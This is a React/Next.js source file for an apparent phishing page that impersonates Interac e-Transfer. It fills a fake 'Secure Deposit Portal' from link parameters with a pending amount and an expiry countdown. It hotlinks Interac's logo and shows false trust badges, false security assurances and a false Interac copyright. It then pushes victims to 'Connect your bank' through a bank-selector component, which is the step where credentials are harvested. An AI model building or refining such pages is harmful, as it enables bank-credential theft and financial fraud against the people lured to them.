"use client"

import { useState, useEffect, Suspense } from "react"
import { useSearchParams } from "next/navigation"
import {
  ShieldCheck,
  ArrowDown,
  CheckCircle,
  AlertCircle,
  Lock,
  Clock,
  Shield,
} from "lucide-react"
import { useLanguage } from "@/lib/i18n/context"
import BankSelectorGrid from "@/components/BankSelectorGrid"
import SearchBar from "@/components/SearchBar"

interface TransferData {
  transferId: string
  amount: string
  recipient: string
  recipientName: string
  bankName: string
  message: string
  timestamp: string
}

function formatAmount(val: string | number) {
  const n = typeof val === "string" ? parseFloat(val) : val
  if (isNaN(n)) return "0.00"
  return n.toLocaleString("en-CA", { minimumFractionDigits: 2, maximumFractionDigits: 2 })
}

function getExpiry(timestamp: string) {
  const base = timestamp ? new Date(timestamp) : new Date()
  base.setDate(base.getDate() + 30)
  return base
}

function ClientDepositContent() {
  const searchParams = useSearchParams()
  const { language, toggleLanguage } = useLanguage()

  const [transferData, setTransferData] = useState<TransferData | null>(null)
  const [timeLeft, setTimeLeft]         = useState("")
  const [searchTerm, setSearchTerm]     = useState("")

  const COPY = {
    en: {
      badge:        "Interac e-Transfer",
      awaiting:     "Awaiting your deposit",
      from:         "From",
      amount:       "Amount",
      reference:    "Reference",
      expires:      "Expires",
      message:      "Message",
      readyTitle:   "Ready to Deposit",
      readyBody:    (amt: string) => `Connect your bank below to complete your $${amt} CAD deposit.`,
      selectBank:   "Select your bank to continue",
      secureNote:   "Your banking credentials are never shared with us. This connection is protected by Interac's 256-bit SSL encryption.",
      trustSsl:     "256-bit SSL",
      trustCdic:    "CDIC Member",
      trustLive:    "Bank-level security",
      noTransfer:   "No transfer found",
      noTransferSub:"This link may be invalid or expired. Please contact the sender for a new link.",
      expired:      "Expired",
    },
    fr: {
      badge:        "Virement Interac",
      awaiting:     "En attente de votre dépôt",
      from:         "De",
      amount:       "Montant",
      reference:    "Référence",
      expires:      "Expire",
      message:      "Message",
      readyTitle:   "Prêt à déposer",
      readyBody:    (amt: string) => `Connectez votre banque ci-dessous pour finaliser votre dépôt de $${amt} CAD.`,
      selectBank:   "Sélectionnez votre banque pour continuer",
      secureNote:   "Vos identifiants bancaires ne sont jamais partagés avec nous. Cette connexion est protégée par le chiffrement SSL 256 bits d'Interac.",
      trustSsl:     "SSL 256 bits",
      trustCdic:    "Membre SADC",
      trustLive:    "Sécurité bancaire",
      noTransfer:   "Aucun virement trouvé",
      noTransferSub:"Ce lien est peut-être invalide ou expiré. Contactez l'expéditeur pour un nouveau lien.",
      expired:      "Expiré",
    },
  }

  const c = COPY[language] ?? COPY.en

  useEffect(() => {
    const transferId    = searchParams.get("transferId")
    const amount        = searchParams.get("amount")
    const recipient     = searchParams.get("recipient")
    const recipientName = searchParams.get("recipientName")
    const bankName      = searchParams.get("bankName")
    const message       = searchParams.get("message")
    const timestamp     = searchParams.get("timestamp")

    if (transferId && amount) {
      const data: TransferData = {
        transferId,
        amount:        amount || "0",
        recipient:     recipient || "",
        recipientName: recipientName || "",
        bankName:      bankName || "QuantumYield",
        message:       message || "",
        timestamp:     timestamp || new Date().toISOString(),
      }
      setTransferData(data)
      try {
        const raw = localStorage.getItem("depositHistory")
        const history = raw ? JSON.parse(raw) : []
        const exists = history.findIndex((h: { transferId: string }) => h.transferId === transferId)
        const entry = { ...data, id: transferId, status: "pending" }
        if (exists >= 0) history[exists] = entry
        else history.unshift(entry)
        localStorage.setItem("depositHistory", JSON.stringify(history.slice(0, 50)))
      } catch { /* silently ignore */ }
    }
  }, []) // eslint-disable-line react-hooks/exhaustive-deps

  useEffect(() => {
    if (!transferData) return
    const expiry = getExpiry(transferData.timestamp)
    const tick = () => {
      const diff = expiry.getTime() - Date.now()
      if (diff <= 0) { setTimeLeft(c.expired); return }
      const d = Math.floor(diff / 86400000)
      const h = Math.floor((diff % 86400000) / 3600000)
      const m = Math.floor((diff % 3600000) / 60000)
      const s = Math.floor((diff % 60000) / 1000)
      if (d > 0) setTimeLeft(`${d}d ${h}h`)
      else if (h > 0) setTimeLeft(`${h}h ${m}m`)
      else setTimeLeft(`${m}m ${s}s`)
    }
    tick()
    const iv = setInterval(tick, 1000)
    return () => clearInterval(iv)
  }, [transferData, language])

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">

      {/* Client header */}
      <header className="bg-white border-b border-gray-200 shadow-sm shrink-0">
        <div className="max-w-4xl mx-auto px-4 h-16 flex items-center justify-between">
          <a href="https://www.interac.ca" target="_blank" rel="noopener noreferrer" className="flex items-center gap-3">
            <div className="w-10 h-10 bg-[#FDB913] rounded-lg flex items-center justify-center shadow-sm">
              <img
                src="https://etransfer-notification.interac.ca/images/new/interac_logo.png"
                alt="Interac"
                className="h-6 object-contain"
              />
            </div>
            <div>
              <p className="text-sm font-bold text-gray-900 leading-none tracking-tight">Interac e&#8209;Transfer</p>
              <p className="text-[10px] text-gray-400 leading-none mt-0.5 font-medium uppercase tracking-wide">Secure Deposit Portal</p>
            </div>
          </a>

          <div className="flex items-center gap-3">
            {/* Language toggle */}
            <div className="flex items-center gap-1 bg-gray-100 border border-gray-200 rounded-lg p-1">
              {(["en", "fr"] as const).map((l) => (
                <button
                  key={l}
                  onClick={() => language !== l && toggleLanguage()}
                  className={`px-3 py-1 rounded-md text-xs font-bold transition-all min-h-[32px] ${
                    language === l
                      ? "bg-[#FDB913] text-black shadow-sm"
                      : "text-gray-500 hover:text-gray-800"
                  }`}
                >
                  {l.toUpperCase()}
                </button>
              ))}
            </div>
            <div className="hidden sm:flex items-center gap-1.5 text-xs font-semibold text-green-700 bg-green-50 border border-green-200 px-3 py-1.5 rounded-full">
              <Shield className="w-3.5 h-3.5" />
              Secured by Interac
            </div>
          </div>
        </div>

        {/* Yellow accent bar */}
        <div className="h-1 bg-[#FDB913]" />
      </header>

      <main className="flex-1 max-w-3xl w-full mx-auto px-4 py-8 space-y-6">

        {!transferData ? (
          <div className="flex flex-col items-center justify-center py-24 text-center space-y-4">
            <div className="w-16 h-16 rounded-full bg-gray-100 border border-gray-200 flex items-center justify-center">
              <AlertCircle className="w-8 h-8 text-gray-400" />
            </div>
            <h2 className="text-xl font-bold text-gray-800">{c.noTransfer}</h2>
            <p className="text-sm text-gray-500 max-w-xs">{c.noTransferSub}</p>
            <a
              href="https://www.interac.ca"
              target="_blank"
              rel="noopener noreferrer"
              className="text-sm font-semibold text-[#1a56a0] hover:underline"
            >
              Visit interac.ca
            </a>
          </div>
        ) : (
          <>
            {/* Transfer details card */}
            <div className="bg-white border border-gray-200 rounded-2xl shadow-sm overflow-hidden">
              <div className="px-6 py-5 border-b border-gray-100 flex items-center justify-between gap-3 flex-wrap bg-amber-50">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-xl bg-amber-100 flex items-center justify-center">
                    <Clock className="w-5 h-5 text-amber-600" />
                  </div>
                  <div>
                    <p className="text-sm font-semibold text-gray-800">{c.awaiting}</p>
                    <p className="text-xs text-gray-500">{c.expires}: <span className="font-semibold text-amber-600">{timeLeft}</span></p>
                  </div>
                </div>
                <span className="px-3 py-1 bg-amber-100 text-amber-700 border border-amber-200 rounded-full text-xs font-semibold">
                  Pending
                </span>
              </div>

              <div className="px-6 py-6 space-y-5">
                <div>
                  <p className="text-xs text-gray-400 mb-1 font-medium uppercase tracking-wider">{c.amount}</p>
                  <div className="flex items-baseline gap-2">
                    <span className="text-5xl font-bold text-gray-900">
                      ${formatAmount(transferData.amount)}
                    </span>
                    <span className="text-xl font-semibold text-gray-400">CAD</span>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4 pt-4 border-t border-gray-100">
                  {transferData.bankName && (
                    <div>
                      <p className="text-xs text-gray-400 mb-0.5 font-medium uppercase tracking-wider">{c.from}</p>
                      <p className="text-sm font-semibold text-gray-800">{transferData.bankName}</p>
                    </div>
                  )}
                  <div>
                    <p className="text-xs text-gray-400 mb-0.5 font-medium uppercase tracking-wider">{c.reference}</p>
                    <p className="text-xs font-mono text-gray-600">{transferData.transferId}</p>
                  </div>
                  {transferData.message && (
                    <div className="col-span-2">
                      <p className="text-xs text-gray-400 mb-0.5 font-medium uppercase tracking-wider">{c.message}</p>
                      <p className="text-sm text-gray-700">{transferData.message}</p>
                    </div>
                  )}
                </div>
              </div>
            </div>

            {/* Ready banner */}
            <div className="bg-green-50 border border-green-200 rounded-xl p-5 flex items-start gap-4">
              <div className="w-10 h-10 shrink-0 rounded-full bg-green-500 flex items-center justify-center">
                <CheckCircle className="w-5 h-5 text-white" />
              </div>
              <div>
                <p className="text-sm font-bold text-green-800">{c.readyTitle}</p>
                <p className="text-sm text-green-700 mt-0.5">
                  {c.readyBody(formatAmount(transferData.amount))}
                </p>
              </div>
            </div>

            {/* Bank selector */}
            <section className="space-y-4">
              <div className="flex items-center justify-between flex-wrap gap-3">
                <h2 className="text-base font-semibold text-gray-800 flex items-center gap-2">
                  <ArrowDown className="w-4 h-4 text-[#FDB913]" />
                  {c.selectBank}
                </h2>
                <SearchBar onSearch={setSearchTerm} clientMode />
              </div>
              <BankSelectorGrid searchTerm={searchTerm} transferData={transferData} clientMode />
            </section>

            {/* Security note */}
            <div className="flex items-start gap-3 px-4 py-4 bg-white rounded-xl border border-gray-200 shadow-sm">
              <Lock className="w-4 h-4 text-gray-400 shrink-0 mt-0.5" />
              <p className="text-xs text-gray-500 leading-relaxed">{c.secureNote}</p>
            </div>
          </>
        )}

        {/* Trust bar */}
        <div className="flex items-center justify-center gap-6 flex-wrap pt-4 border-t border-gray-200">
          {[
            { icon: ShieldCheck, label: c.trustSsl },
            { icon: Lock,        label: c.trustLive },
            { icon: CheckCircle, label: c.trustCdic },
          ].map(({ icon: Icon, label }) => (
            <div key={label} className="flex items-center gap-1.5 text-gray-400">
              <Icon className="w-3.5 h-3.5" />
              <span className="text-xs font-medium">{label}</span>
            </div>
          ))}
        </div>
      </main>

      {/* Client footer */}
      <footer className="bg-white border-t border-gray-200 py-6 px-4 shrink-0">
        <div className="max-w-3xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-gray-400">
          <div className="flex items-center gap-2">
            <div className="w-5 h-5 bg-[#FDB913] rounded flex items-center justify-center">
              <img
                src="https://etransfer-notification.interac.ca/images/new/interac_logo.png"
                alt=""
                className="h-3.5 object-contain"
              />
            </div>
            <span>&copy; {new Date().getFullYear()} Interac Corp. All rights reserved.</span>
          </div>
          <div className="flex items-center gap-4">
            <a href="https://www.interac.ca/en/consumers/privacy/" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">Privacy Policy</a>
            <span className="w-1 h-1 rounded-full bg-gray-300" />
            <a href="https://www.interac.ca/en/consumers/legal/" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">Terms of Use</a>
            <span className="w-1 h-1 rounded-full bg-gray-300" />
            <a href="https://www.interac.ca" target="_blank" rel="noopener noreferrer" className="hover:text-gray-600 transition-colors">interac.ca</a>
          </div>
        </div>
      </footer>
    </div>
  )
}

export default function ClientDepositPortal() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="w-8 h-8 border-4 border-[#FDB913] border-r-transparent rounded-full animate-spin" />
      </div>
    }>
      <ClientDepositContent />
    </Suspense>
  )
}
